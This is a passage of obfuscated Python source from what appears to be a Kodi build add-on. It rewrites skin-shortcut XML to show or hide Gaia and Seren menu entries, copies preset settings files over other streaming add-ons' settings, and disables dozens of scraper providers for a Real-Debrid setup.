    with open (OO000OO0O0O000000 ,'w')as OOOOOOOOOO0OOO000 :#line:1371
      OOOOOOOOOO0OOO000 .write (O00O0O00O00O000OO )#line:1372
    OO000OO0O0O000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1376
    with open (OO000OO0O0O000000 ,'r')as OOOOOOOOOO0OOO000 :#line:1377
      O00O0O00O00O000OO =OOOOOOOOOO0OOO000 .read ()#line:1378
    O00O0O00O00O000OO =O00O0O00O00O000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1396
    with open (OO000OO0O0O000000 ,'w')as OOOOOOOOOO0OOO000 :#line:1399
      OOOOOOOOOO0OOO000 .write (O00O0O00O00O000OO )#line:1400
    OO000OO0O0O000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1403
    with open (OO000OO0O0O000000 ,'r')as OOOOOOOOOO0OOO000 :#line:1404
      O00O0O00O00O000OO =OOOOOOOOOO0OOO000 .read ()#line:1405
    O00O0O00O00O000OO =O00O0O00O00O000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1423
    with open (OO000OO0O0O000000 ,'w')as OOOOOOOOOO0OOO000 :#line:1426
      OOOOOOOOOO0OOO000 .write (O00O0O00O00O000OO )#line:1427
    OO000OO0O0O000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1429
    with open (OO000OO0O0O000000 ,'r')as OOOOOOOOOO0OOO000 :#line:1430
      O00O0O00O00O000OO =OOOOOOOOOO0OOO000 .read ()#line:1431
    O00O0O00O00O000OO =O00O0O00O00O000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1449
    with open (OO000OO0O0O000000 ,'w')as OOOOOOOOOO0OOO000 :#line:1452
      OOOOOOOOOO0OOO000 .write (O00O0O00O00O000OO )#line:1453
    OO000OO0O0O000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1455
    with open (OO000OO0O0O000000 ,'r')as OOOOOOOOOO0OOO000 :#line:1456
      O00O0O00O00O000OO =OOOOOOOOOO0OOO000 .read ()#line:1457
    O00O0O00O00O000OO =O00O0O00O00O000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1475
    with open (OO000OO0O0O000000 ,'w')as OOOOOOOOOO0OOO000 :#line:1478
      OOOOOOOOOO0OOO000 .write (O00O0O00O00O000OO )#line:1479
    OO000OO0O0O000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1482
    with open (OO000OO0O0O000000 ,'r')as OOOOOOOOOO0OOO000 :#line:1483
      O00O0O00O00O000OO =OOOOOOOOOO0OOO000 .read ()#line:1484
    O00O0O00O00O000OO =O00O0O00O00O000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1502
    with open (OO000OO0O0O000000 ,'w')as OOOOOOOOOO0OOO000 :#line:1505
      OOOOOOOOOO0OOO000 .write (O00O0O00O00O000OO )#line:1506
def rdbuildinstalloff ():#line:1509
    try :#line:1510
       OOO0000OO0OO0O0OO =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1511
       O00O0O0O00OOOOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1512
       copyfile (OOO0000OO0OO0O0OO ,O00O0O0O00OOOOOOO )#line:1514
       OOO0000OO0OO0O0OO =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1516
       O00O0O0O00OOOOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1517
       copyfile (OOO0000OO0OO0O0OO ,O00O0O0O00OOOOOOO )#line:1519
       OOO0000OO0OO0O0OO =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1521
       O00O0O0O00OOOOOOO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1522
       copyfile (OOO0000OO0OO0O0OO ,O00O0O0O00OOOOOOO )#line:1524
       OOO0000OO0OO0O0OO =ADDONPATH +"/resources/rdoff/Splash.png"#line:1527
       O00O0O0O00OOOOOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1528
       copyfile (OOO0000OO0OO0O0OO ,O00O0O0O00OOOOOOO )#line:1530
    except :#line:1532
       pass #line:1533
def rdbuildaddonON ():#line:1540
    O0O0O0O0OO0OOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1542
    with open (O0O0O0O0OO0OOO0O0 ,'r')as OO0O00000OO0OO0O0 :#line:1543
      O0OO0O0OO0OO0O000 =OO0O00000OO0OO0O0 .read ()#line:1544
    O0OO0O0OO0OO0O000 =O0OO0O0OO0OO0O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1562
    with open (O0O0O0O0OO0OOO0O0 ,'w')as OO0O00000OO0OO0O0 :#line:1565
      OO0O00000OO0OO0O0 .write (O0OO0O0OO0OO0O000 )#line:1566
    O0O0O0O0OO0OOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1570
    with open (O0O0O0O0OO0OOO0O0 ,'r')as OO0O00000OO0OO0O0 :#line:1571
      O0OO0O0OO0OO0O000 =OO0O00000OO0OO0O0 .read ()#line:1572
    O0OO0O0OO0OO0O000 =O0OO0O0OO0OO0O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1590
    with open (O0O0O0O0OO0OOO0O0 ,'w')as OO0O00000OO0OO0O0 :#line:1593
      OO0O00000OO0OO0O0 .write (O0OO0O0OO0OO0O000 )#line:1594
    O0O0O0O0OO0OOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1598
    with open (O0O0O0O0OO0OOO0O0 ,'r')as OO0O00000OO0OO0O0 :#line:1599
      O0OO0O0OO0OO0O000 =OO0O00000OO0OO0O0 .read ()#line:1600
    O0OO0O0OO0OO0O000 =O0OO0O0OO0OO0O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1618
    with open (O0O0O0O0OO0OOO0O0 ,'w')as OO0O00000OO0OO0O0 :#line:1621
      OO0O00000OO0OO0O0 .write (O0OO0O0OO0OO0O000 )#line:1622
    O0O0O0O0OO0OOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1626
    with open (O0O0O0O0OO0OOO0O0 ,'r')as OO0O00000OO0OO0O0 :#line:1627
      O0OO0O0OO0OO0O000 =OO0O00000OO0OO0O0 .read ()#line:1628
    O0OO0O0OO0OO0O000 =O0OO0O0OO0OO0O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1646
    with open (O0O0O0O0OO0OOO0O0 ,'w')as OO0O00000OO0OO0O0 :#line:1649
      OO0O00000OO0OO0O0 .write (O0OO0O0OO0OO0O000 )#line:1650
    O0O0O0O0OO0OOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1653
    with open (O0O0O0O0OO0OOO0O0 ,'r')as OO0O00000OO0OO0O0 :#line:1654
      O0OO0O0OO0OO0O000 =OO0O00000OO0OO0O0 .read ()#line:1655
    O0OO0O0OO0OO0O000 =O0OO0O0OO0OO0O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1673
    with open (O0O0O0O0OO0OOO0O0 ,'w')as OO0O00000OO0OO0O0 :#line:1676
      OO0O00000OO0OO0O0 .write (O0OO0O0OO0OO0O000 )#line:1677
    O0O0O0O0OO0OOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1679
    with open (O0O0O0O0OO0OOO0O0 ,'r')as OO0O00000OO0OO0O0 :#line:1680
      O0OO0O0OO0OO0O000 =OO0O00000OO0OO0O0 .read ()#line:1681
    O0OO0O0OO0OO0O000 =O0OO0O0OO0OO0O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1699
    with open (O0O0O0O0OO0OOO0O0 ,'w')as OO0O00000OO0OO0O0 :#line:1702
      OO0O00000OO0OO0O0 .write (O0OO0O0OO0OO0O000 )#line:1703
    O0O0O0O0OO0OOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1705
    with open (O0O0O0O0OO0OOO0O0 ,'r')as OO0O00000OO0OO0O0 :#line:1706
      O0OO0O0OO0OO0O000 =OO0O00000OO0OO0O0 .read ()#line:1707
    O0OO0O0OO0OO0O000 =O0OO0O0OO0OO0O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1725
    with open (O0O0O0O0OO0OOO0O0 ,'w')as OO0O00000OO0OO0O0 :#line:1728
      OO0O00000OO0OO0O0 .write (O0OO0O0OO0OO0O000 )#line:1729
    O0O0O0O0OO0OOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1732
    with open (O0O0O0O0OO0OOO0O0 ,'r')as OO0O00000OO0OO0O0 :#line:1733
      O0OO0O0OO0OO0O000 =OO0O00000OO0OO0O0 .read ()#line:1734
    O0OO0O0OO0OO0O000 =O0OO0O0OO0OO0O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1752
    with open (O0O0O0O0OO0OOO0O0 ,'w')as OO0O00000OO0OO0O0 :#line:1755
      OO0O00000OO0OO0O0 .write (O0OO0O0OO0OO0O000 )#line:1756
def rdbuildinstallON ():#line:1759
    try :#line:1761
       O00O0O00O00OOOO00 =ADDONPATH +"/resources/rd/victory.xml"#line:1762
       O000OOO00000O0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1763
       copyfile (O00O0O00O00OOOO00 ,O000OOO00000O0O00 )#line:1765
       O00O0O00O00OOOO00 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1767
       O000OOO00000O0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1768
       copyfile (O00O0O00O00OOOO00 ,O000OOO00000O0O00 )#line:1770
       O00O0O00O00OOOO00 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1772
       O000OOO00000O0O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1773
       copyfile (O00O0O00O00OOOO00 ,O000OOO00000O0O00 )#line:1775
       O00O0O00O00OOOO00 =ADDONPATH +"/resources/rd/Splash.png"#line:1778
       O000OOO00000O0O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1779
       copyfile (O00O0O00O00OOOO00 ,O000OOO00000O0O00 )#line:1781
    except :#line:1783
       pass #line:1784
def rdbuild ():#line:1794
	OOO0OO0O0OOOOOOO0 =(ADDON .getSetting ("auto_rd"))#line:1795
	if OOO0OO0O0OOOOOOO0 =='true':#line:1796
		OOOO0000OO000OOOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1797
		OOOO0000OO000OOOO .setSetting ('all_t','0')#line:1798
		OOOO0000OO000OOOO .setSetting ('rd_menu_enable','false')#line:1799
		OOOO0000OO000OOOO .setSetting ('magnet_bay','false')#line:1800
		OOOO0000OO000OOOO .setSetting ('magnet_extra','false')#line:1801
		OOOO0000OO000OOOO .setSetting ('rd_only','false')#line:1802
		OOOO0000OO000OOOO .setSetting ('ftp','false')#line:1804
		OOOO0000OO000OOOO .setSetting ('fp','false')#line:1805
		OOOO0000OO000OOOO .setSetting ('filter_fp','false')#line:1806
		OOOO0000OO000OOOO .setSetting ('fp_size_en','false')#line:1807
		OOOO0000OO000OOOO .setSetting ('afdah','false')#line:1808
		OOOO0000OO000OOOO .setSetting ('ap2s','false')#line:1809
		OOOO0000OO000OOOO .setSetting ('cin','false')#line:1810
		OOOO0000OO000OOOO .setSetting ('clv','false')#line:1811
		OOOO0000OO000OOOO .setSetting ('cmv','false')#line:1812
		OOOO0000OO000OOOO .setSetting ('dl20','false')#line:1813
		OOOO0000OO000OOOO .setSetting ('esc','false')#line:1814
		OOOO0000OO000OOOO .setSetting ('extra','false')#line:1815
		OOOO0000OO000OOOO .setSetting ('film','false')#line:1816
		OOOO0000OO000OOOO .setSetting ('fre','false')#line:1817
		OOOO0000OO000OOOO .setSetting ('fxy','false')#line:1818
		OOOO0000OO000OOOO .setSetting ('genv','false')#line:1819
		OOOO0000OO000OOOO .setSetting ('getgo','false')#line:1820
		OOOO0000OO000OOOO .setSetting ('gold','false')#line:1821
		OOOO0000OO000OOOO .setSetting ('gona','false')#line:1822
		OOOO0000OO000OOOO .setSetting ('hdmm','false')#line:1823
		OOOO0000OO000OOOO .setSetting ('hdt','false')#line:1824
		OOOO0000OO000OOOO .setSetting ('icy','false')#line:1825
		OOOO0000OO000OOOO .setSetting ('ind','false')#line:1826
		OOOO0000OO000OOOO .setSetting ('iwi','false')#line:1827
		OOOO0000OO000OOOO .setSetting ('jen_free','false')#line:1828
		OOOO0000OO000OOOO .setSetting ('kiss','false')#line:1829
		OOOO0000OO000OOOO .setSetting ('lavin','false')#line:1830
		OOOO0000OO000OOOO .setSetting ('los','false')#line:1831
		OOOO0000OO000OOOO .setSetting ('m4u','false')#line:1832
		OOOO0000OO000OOOO .setSetting ('mesh','false')#line:1833
		OOOO0000OO000OOOO .setSetting ('mf','false')#line:1834
		OOOO0000OO000OOOO .setSetting ('mkvc','false')#line:1835
		OOOO0000OO000OOOO .setSetting ('mjy','false')#line:1836
		OOOO0000OO000OOOO .setSetting ('hdonline','false')#line:1837
		OOOO0000OO000OOOO .setSetting ('moviex','false')#line:1838
		OOOO0000OO000OOOO .setSetting ('mpr','false')#line:1839
		OOOO0000OO000OOOO .setSetting ('mvg','false')#line:1840
		OOOO0000OO000OOOO .setSetting ('mvl','false')#line:1841
		OOOO0000OO000OOOO .setSetting ('mvs','false')#line:1842
		OOOO0000OO000OOOO .setSetting ('myeg','false')#line:1843
		OOOO0000OO000OOOO .setSetting ('ninja','false')#line:1844
		OOOO0000OO000OOOO .setSetting ('odb','false')#line:1845
		OOOO0000OO000OOOO .setSetting ('ophd','false')#line:1846
		OOOO0000OO000OOOO .setSetting ('pks','false')#line:1847
		OOOO0000OO000OOOO .setSetting ('prf','false')#line:1848
		OOOO0000OO000OOOO .setSetting ('put18','false')#line:1849
		OOOO0000OO000OOOO .setSetting ('req','false')#line:1850
		OOOO0000OO000OOOO .setSetting ('rftv','false')#line:1851
		OOOO0000OO000OOOO .setSetting ('rltv','false')#line:1852
		OOOO0000OO000OOOO .setSetting ('sc','false')#line:1853
		OOOO0000OO000OOOO .setSetting ('seehd','false')#line:1854
		OOOO0000OO000OOOO .setSetting ('showbox','false')#line:1855
		OOOO0000OO000OOOO .setSetting ('shuid','false')#line:1856
		OOOO0000OO000OOOO .setSetting ('sil_gh','false')#line:1857
		OOOO0000OO000OOOO .setSetting ('spv','false')#line:1858
		OOOO0000OO000OOOO .setSetting ('subs','false')#line:1859
		OOOO0000OO000OOOO .setSetting ('tvs','false')#line:1860
		OOOO0000OO000OOOO .setSetting ('tw','false')#line:1861
		OOOO0000OO000OOOO .setSetting ('upto','false')#line:1862
		OOOO0000OO000OOOO .setSetting ('vel','false')#line:1863
		OOOO0000OO000OOOO .setSetting ('vex','false')#line:1864
		OOOO0000OO000OOOO .setSetting ('vidc','false')#line:1865
		OOOO0000OO000OOOO .setSetting ('w4hd','false')#line:1866
		OOOO0000OO000OOOO .setSetting ('wav','false')#line:1867
		OOOO0000OO000OOOO .setSetting ('wf','false')#line:1868
		OOOO0000OO000OOOO .setSetting ('wse','false')#line:1869
		OOOO0000OO000OOOO .setSetting ('wss','false')#line:1870
		OOOO0000OO000OOOO .setSetting ('wsse','false')#line:1871
		OOOO0000OO000OOOO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1872
		OOOO0000OO000OOOO .setSetting ('debrid.only','true')#line:1873
		OOOO0000OO000OOOO .setSetting ('hosts.captcha','false')#line:1874
		OOOO0000OO000OOOO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1875
		OOOO0000OO000OOOO .setSetting ('provider.123moviehd','false')#line:1876
		OOOO0000OO000OOOO .setSetting ('provider.300mbdownload','false')#line:1877
		OOOO0000OO000OOOO .setSetting ('provider.alltube','false')#line:1878
		OOOO0000OO000OOOO .setSetting ('provider.allucde','false')#line:1879
		OOOO0000OO000OOOO .setSetting ('provider.animebase','false')#line:1880
		OOOO0000OO000OOOO .setSetting ('provider.animeloads','false')#line:1881
		OOOO0000OO000OOOO .setSetting ('provider.animetoon','false')#line:1882
		OOOO0000OO000OOOO .setSetting ('provider.bnwmovies','false')#line:1883
		OOOO0000OO000OOOO .setSetting ('provider.boxfilm','false')#line:1884
		OOOO0000OO000OOOO .setSetting ('provider.bs','false')#line:1885
		OOOO0000OO000OOOO .setSetting ('provider.cartoonhd','false')#line:1886
		OOOO0000OO000OOOO .setSetting ('provider.cdahd','false')#line:1887
		OOOO0000OO000OOOO .setSetting ('provider.cdax','false')#line:1888
		OOOO0000OO000OOOO .setSetting ('provider.cine','false')#line:1889
		OOOO0000OO000OOOO .setSetting ('provider.cinenator','false')#line:1890
		OOOO0000OO000OOOO .setSetting ('provider.cmovieshdbz','false')#line:1891
		OOOO0000OO000OOOO .setSetting ('provider.coolmoviezone','false')#line:1892
		OOOO0000OO000OOOO .setSetting ('provider.ddl','false')#line:1893
		OOOO0000OO000OOOO .setSetting ('provider.deepmovie','false')#line:1894
		OOOO0000OO000OOOO .setSetting ('provider.ekinomaniak','false')#line:1895
		OOOO0000OO000OOOO .setSetting ('provider.ekinotv','false')#line:1896
		OOOO0000OO000OOOO .setSetting ('provider.filiser','false')#line:1897
		OOOO0000OO000OOOO .setSetting ('provider.filmpalast','false')#line:1898
		OOOO0000OO000OOOO .setSetting ('provider.filmwebbooster','false')#line:1899
		OOOO0000OO000OOOO .setSetting ('provider.filmxy','false')#line:1900
		OOOO0000OO000OOOO .setSetting ('provider.fmovies','false')#line:1901
		OOOO0000OO000OOOO .setSetting ('provider.foxx','false')#line:1902
		OOOO0000OO000OOOO .setSetting ('provider.freefmovies','false')#line:1903
		OOOO0000OO000OOOO .setSetting ('provider.freeputlocker','false')#line:1904
		OOOO0000OO000OOOO .setSetting ('provider.furk','false')#line:1905
		OOOO0000OO000OOOO .setSetting ('provider.gamatotv','false')#line:1906
		OOOO0000OO000OOOO .setSetting ('provider.gogoanime','false')#line:1907
		OOOO0000OO000OOOO .setSetting ('provider.gowatchseries','false')#line:1908
		OOOO0000OO000OOOO .setSetting ('provider.hackimdb','false')#line:1909
		OOOO0000OO000OOOO .setSetting ('provider.hdfilme','false')#line:1910
		OOOO0000OO000OOOO .setSetting ('provider.hdmto','false')#line:1911
		OOOO0000OO000OOOO .setSetting ('provider.hdpopcorns','false')#line:1912
		OOOO0000OO000OOOO .setSetting ('provider.hdstreams','false')#line:1913
		OOOO0000OO000OOOO .setSetting ('provider.horrorkino','false')#line:1915
		OOOO0000OO000OOOO .setSetting ('provider.iitv','false')#line:1916
		OOOO0000OO000OOOO .setSetting ('provider.iload','false')#line:1917
		OOOO0000OO000OOOO .setSetting ('provider.iwaatch','false')#line:1918
		OOOO0000OO000OOOO .setSetting ('provider.kinodogs','false')#line:1919
		OOOO0000OO000OOOO .setSetting ('provider.kinoking','false')#line:1920
		OOOO0000OO000OOOO .setSetting ('provider.kinow','false')#line:1921
		OOOO0000OO000OOOO .setSetting ('provider.kinox','false')#line:1922
		OOOO0000OO000OOOO .setSetting ('provider.lichtspielhaus','false')#line:1923
		OOOO0000OO000OOOO .setSetting ('provider.liomenoi','false')#line:1924
		OOOO0000OO000OOOO .setSetting ('provider.magnetdl','false')#line:1927
		OOOO0000OO000OOOO .setSetting ('provider.megapelistv','false')#line:1928
		OOOO0000OO000OOOO .setSetting ('provider.movie2k-ac','false')#line:1929
		OOOO0000OO000OOOO .setSetting ('provider.movie2k-ag','false')#line:1930
		OOOO0000OO000OOOO .setSetting ('provider.movie2z','false')#line:1931
		OOOO0000OO000OOOO .setSetting ('provider.movie4k','false')#line:1932
		OOOO0000OO000OOOO .setSetting ('provider.movie4kis','false')#line:1933
		OOOO0000OO000OOOO .setSetting ('provider.movieneo','false')#line:1934
		OOOO0000OO000OOOO .setSetting ('provider.moviesever','false')#line:1935
		OOOO0000OO000OOOO .setSetting ('provider.movietown','false')#line:1936
		OOOO0000OO000OOOO .setSetting ('provider.mvrls','false')#line:1938
		OOOO0000OO000OOOO .setSetting ('provider.netzkino','false')#line:1939
		OOOO0000OO000OOOO .setSetting ('provider.odb','false')#line:1940
		OOOO0000OO000OOOO .setSetting ('provider.openkatalog','false')#line:1941
		OOOO0000OO000OOOO .setSetting ('provider.ororo','false')#line:1942
		OOOO0000OO000OOOO .setSetting ('provider.paczamy','false')#line:1943
		OOOO0000OO000OOOO .setSetting ('provider.peliculasdk','false')#line:1944
		OOOO0000OO000OOOO .setSetting ('provider.pelisplustv','false')#line:1945
		OOOO0000OO000OOOO .setSetting ('provider.pepecine','false')#line:1946
